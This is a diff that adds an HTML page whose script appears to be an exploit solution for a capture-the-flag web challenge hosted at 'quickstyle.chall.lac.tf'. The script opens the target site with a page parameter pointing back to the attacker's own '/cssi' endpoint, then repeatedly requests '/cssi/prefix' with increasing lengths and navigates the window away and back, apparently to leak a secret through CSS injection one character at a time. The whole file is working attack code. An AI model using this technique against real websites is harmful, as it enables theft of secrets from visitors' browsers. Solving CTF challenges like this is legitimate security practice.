@@ -1,0 +1,35 @@
+<body>
+  <script>
+    // const BASE_URL = "http://web:3000";
+    const BASE_URL = "https://quickstyle.chall.lac.tf";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const back = async (win) => {
+      while (true) {
+        try {
+          console.log(win.history);
+          win.history.back();
+          return;
+        } catch {
+          await sleep(10);
+        }
+      }
+    };
+
+    const TARGET_LEN = 80;
+
+    const main = async () => {
+      const user = "username_xxxxx";
+      const page = `${location.origin}/cssi`;
+      const win = open(`${BASE_URL}/?${new URLSearchParams({ user, page })}`);
+
+      for (let len = 1; len < TARGET_LEN; len++) {
+        await fetch(`/cssi/prefix?len=${len}`);
+        win.location = `about:blank`;
+        await back(win);
+      }
+    };
+    main();
+  </script>
+</body>
